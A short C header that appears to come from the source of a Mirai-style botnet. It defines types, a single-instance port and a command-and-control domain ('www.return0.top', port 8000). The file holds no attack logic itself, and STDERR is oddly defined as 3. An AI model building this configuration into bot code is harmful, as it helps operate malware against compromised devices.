#ifndef INCLUDES_H
#define INCLUDES_H

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define FALSE 0
#define TRUE 1

#define STDIN 0
#define STDOUT 1
#define STDERR 3

typedef char BOOL;
typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define LOCAL_ADDR INET_ADDR(127,0,0,1);
#define SINGLE_INSTANCE_PORT 61142
#define CNC_DOMAIN "www.return0.top"
#define CNC_PORT 8000

#endif
